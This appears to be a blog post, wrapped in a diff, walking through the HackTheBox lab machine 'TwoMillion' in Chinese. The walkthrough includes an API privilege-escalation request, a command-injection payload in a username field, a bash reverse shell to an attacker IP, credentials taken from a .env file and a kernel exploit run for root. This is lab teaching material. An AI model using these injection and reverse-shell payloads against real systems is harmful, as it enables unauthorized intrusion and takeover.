@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"dawoxiansigema.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="TwoMillion is an Easy difficulty Linux box that was released to celebrate reaching 2 million users on HackTheBox. The box features an old version of the HackTheBox platform that includes the old hacka">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TwoMillion">
+<meta property="og:url" content="http://dawoxiansigema.github.io/2025/10/19/TwoMillion/index.html">
+<meta property="og:site_name" content="Eur3ka&#39;s Studio">
+<meta property="og:description" content="TwoMillion is an Easy difficulty Linux box that was released to celebrate reaching 2 million users on HackTheBox. The box features an old version of the HackTheBox platform that includes the old hacka">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://dawoxiansigema.github.io/2025/10/19/TwoMillion/1.png">
+<meta property="og:image" content="http://dawoxiansigema.github.io/2025/10/19/TwoMillion/2.png">
+<meta property="og:image" content="http://dawoxiansigema.github.io/2025/10/19/TwoMillion/3.png">
+<meta property="og:image" content="http://dawoxiansigema.github.io/2025/10/19/TwoMillion/4.png">
+<meta property="og:image" content="http://dawoxiansigema.github.io/2025/10/19/TwoMillion/5.png">
+<meta property="article:published_time" content="2025-10-18T16:34:11.000Z">
+<meta property="article:modified_time" content="2025-10-19T16:03:14.672Z">
+<meta property="article:author" content="Xu Haoxiang">
+<meta property="article:tag" content="HTB">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://dawoxiansigema.github.io/2025/10/19/TwoMillion/1.png">
+
+
+<link rel="canonical" href="http://dawoxiansigema.github.io/2025/10/19/TwoMillion/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://dawoxiansigema.github.io/2025/10/19/TwoMillion/","path":"2025/10/19/TwoMillion/","title":"TwoMillion"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>TwoMillion | Eur3ka's Studio</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Eur3ka's Studio</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Recon"><span class="nav-number">1.</span> <span class="nav-text">Recon</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shell-as-www-data"><span class="nav-number">2.</span> <span class="nav-text">Shell as www-data</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shell-as-admin"><span class="nav-number">3.</span> <span class="nav-text">Shell as admin</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shell-as-root"><span class="nav-number">4.</span> <span class="nav-text">Shell as root</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Xu Haoxiang"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Xu Haoxiang</p>
+  <div class="site-description" itemprop="description">Never again.</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://dawoxiansigema.github.io/2025/10/19/TwoMillion/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Xu Haoxiang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Eur3ka's Studio">
+      <meta itemprop="description" content="Never again.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="TwoMillion | Eur3ka's Studio">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          TwoMillion
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2025-10-19 00:34:11" itemprop="dateCreated datePublished" datetime="2025-10-19T00:34:11+08:00">2025-10-19</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2025-10-20 00:03:14" itemprop="dateModified" datetime="2025-10-20T00:03:14+08:00">2025-10-20</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>TwoMillion is an Easy difficulty Linux box that was released to celebrate reaching 2 million users on HackTheBox. The box features an old version of the HackTheBox platform that includes the old hackable invite code. After hacking the invite code an account can be created on the platform. The account can be used to enumerate various API endpoints, one of which can be used to elevate the user to an Administrator. With administrative access the user can perform a command injection in the admin VPN generation endpoint thus gaining a system shell. An .env file is found to contain database credentials and owed to password re-use the attackers can login as user admin on the box. The system kernel is found to be outdated and CVE-2023-0386 can be used to gain a root shell.</p>
+<span id="more"></span>
+
+<h1 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h1><pre><code>❯ sudo nmap -sCV 10.10.11.221
+Password:
+Starting Nmap 7.98 ( https://nmap.org ) at 2025-10-13 22:03 +0800
+Nmap scan report for 10.10.11.221 (10.10.11.221)
+Host is up (0.34s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp open  http    nginx
+|_http-title: Did not follow redirect to http://2million.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 22.37 seconds
+</code></pre>
+<p>对该虚拟机进行端口扫描 并没有特别之处 正常访问80端口进行下一步搜集 域名为<code>http://2million.htb/</code> 加入hosts后继续</p>
+<p><img src="/2025/10/19/TwoMillion/1.png"></p>
+<p>最开始的想法是测试login服务 初步测试之后想法不多 再有忘记密码功能并没有实现 并且没有掌握任何一个账号 就先往下走看别的</p>
+<p><img src="/2025/10/19/TwoMillion/2.png"></p>
+<p>想着既然没有账号可以先注册一个试一下 感觉前端没有什么其他地方了 框架信息也不完整</p>
+<p><img src="/2025/10/19/TwoMillion/3.png"></p>
+<p>没想到稍微看一下源代码就震撼到我了 这个token居然可能存在本地 之后通过Sign Up按钮点击访问api后 在浏览器network工具里找到了invite.js的混淆代码 当然直接去sources里面看也行 通过de4js反混淆得到源代码</p>
+<pre><code>function verifyInviteCode(code) &#123;
+    var formData = &#123;
+        &quot;code&quot;: code
+    &#125;;
+    $.ajax(&#123;
+        type: &quot;POST&quot;,
+        dataType: &quot;json&quot;,
+        data: formData,
+        url: &#39;/api/v1/invite/verify&#39;,
+        success: function (response) &#123;
+            console.log(response)
+        &#125;,
+        error: function (response) &#123;
+            console.log(response)
+        &#125;
+    &#125;)
+&#125;
+
+function makeInviteCode() &#123;
+    $.ajax(&#123;
+        type: &quot;POST&quot;,
+        dataType: &quot;json&quot;,
+        url: &#39;/api/v1/invite/how/to/generate&#39;,
+        success: function (response) &#123;
+            console.log(response)
+        &#125;,
+        error: function (response) &#123;
+            console.log(response)
+        &#125;
+    &#125;)
+&#125;
+</code></pre>
+<p>后面再根据rot13和base64的decode 拿到邀请码<code>DNPHX-YN4DS-8EXE0-DO6WQ</code></p>
+<h1 id="Shell-as-www-data"><a href="#Shell-as-www-data" class="headerlink" title="Shell as www-data"></a>Shell as www-data</h1><p>尝试了一下直接访问<code>/api/v1</code>想看看是否存在api列表 发现返回了401 但是暂时不知道token是什么形式的</p>
+<p><img src="/2025/10/19/TwoMillion/4.png"></p>
+<p>于是乎先在网站里面登录一下 在里面寻找是否有和api接口交互的地方 最终在Access那边的generate vpn处找到 此时用burp抓包再访问 就带有token了 获取到api接口列表</p>
+<pre><code>&quot;PUT&quot;:&#123;
+    &quot;\/api\/v1\/admin\/settings\/update&quot;:&quot;Update user settings&quot;
+&#125;
+</code></pre>
+<p>发现这个api居然可以不判断是否是admin就可以做到将用户状态修改为admin 实在逆天 接下来修改请求为put并缝缝补补后成功将用户改为admin角色</p>
+<pre><code>//请求内容
+PUT /api/v1/admin/settings/update HTTP/1.1
+...
+Content-Type: application/json //记得加这行
+...
+
+&#123;
+	&quot;email&quot;:    &quot;1@qq.com&quot;,
+    &quot;is_admin&quot;:1
+&#125;
+
+//收到response
+HTTP/1.1 200 OK
+...
+
+&#123;&quot;id&quot;:13,&quot;username&quot;:&quot;123&quot;,&quot;is_admin&quot;:1&#125;
+</code></pre>
+<p>之后看到generate vpn 想到后端的命令肯定是<code>genvpn.sh username</code> 那么就可以在后面加封号以命令注入 记得还要#号 后面还有其他命令应该</p>
+<pre><code>&#123;
+	&quot;username&quot;:&quot;123; id #&quot;
+&#125;
+</code></pre>
+<p>接下来就可以reverse_shell了 成功连上shell</p>
+<pre><code>&#123;
+	&quot;username&quot;:&quot;123; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.16.4/4444 0&gt;&amp;1&#39; #&quot;
+&#125;
+
+❯ nc -lv 4444
+bash: cannot set terminal process group (1194): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@2million:~/html$
+</code></pre>
+<h1 id="Shell-as-admin"><a href="#Shell-as-admin" class="headerlink" title="Shell as admin"></a>Shell as admin</h1><p>登陆到www-data之后 已经习惯性去找数据库密码来复用啦 查看Database.php发现只有逻辑函数之后 使用<code>ls -a</code>查看是否有环境变量在</p>
+<pre><code>DB_HOST=127.0.0.1
+DB_DATABASE=htb_prod
+DB_USERNAME=admin
+DB_PASSWORD=SuperDuperPass123
+</code></pre>
+<p>在.env文件中发现账号密码 成功登录admin</p>
+<pre><code>admin@2million:~$ cat ~/user.txt
+1207063efec85d3a5c030bf04dd3f02b
+</code></pre>
+<h1 id="Shell-as-root"><a href="#Shell-as-root" class="headerlink" title="Shell as root"></a>Shell as root</h1><p>跑了一遍peas并没有什么收获 一度不知道从何下手 后来看了一下guide发现要去参考一下邮件</p>
+<pre><code>From: ch4p &lt;ch4p@2million.htb&gt;
+To: admin &lt;admin@2million.htb&gt;
+Cc: g0blin &lt;g0blin@2million.htb&gt;
+Subject: Urgent: Patch System OS
+Date: Tue, 1 June 2023 10:45:22 -0700
+Message-ID: &lt;9876543210@2million.htb&gt;
+X-Mailer: ThunderMail Pro 5.2
+
+Hey admin,
+
+I&#39;m know you&#39;re working as fast as you can to do the DB migration. While we&#39;re partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can&#39;t get popped by that.
+
+HTB Godfather
+</code></pre>
+<p>说是有<code>OverlayFS / FUSE</code>这个洞 可是我的peas并没有找出来 我决定搜一下 这台机子是ubuntu的</p>
+<pre><code>╔══════════╣ Operative system
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits
+Linux version 5.15.70-051570-generic (kernel@sita) (gcc (Ubuntu 11.2.0-19ubuntu1) 11.2.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022
+Distributor ID:	Ubuntu
+Description:	Ubuntu 22.04.2 LTS
+Release:	22.04
+Codename:	jammy
+</code></pre>
+<p><img src="/2025/10/19/TwoMillion/5.png"></p>
+<p>但是网站上面说是修复了的 不过使用<code>uname -a</code>显示 这个linux版本是2022年发布的 这个洞是2023年出现的 倒也能说得通? anyway 使用 <a target="_blank" rel="noopener" href="https://github.com/xkaneiki/CVE-2023-0386">POC</a>打通后拿到shell</p>
+<pre><code>admin@2million:~$ cd CVE-2023-0386-main/
+admin@2million:~/CVE-2023-0386-main$ ./exp
+uid:1000 gid:1000
+[+] mount success
+total 8
+drwxrwxr-x 1 root   root     4096 Oct 19 15:46 .
+drwxrwxr-x 6 root   root     4096 Oct 19 15:46 ..
+-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
+[+] exploit success!
+To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.
+See &quot;man sudo_root&quot; for details.
+
+root@2million:~/CVE-2023-0386-main# cat /root/root.txt
+d3b963765c894a265793b81a14a62e58
+</code></pre>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/HTB/" rel="tag"># HTB</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/10/07/Cicada/" rel="prev" title="Cicada">
+                  <i class="fa fa-angle-left"></i> Cicada
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Xu Haoxiang</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
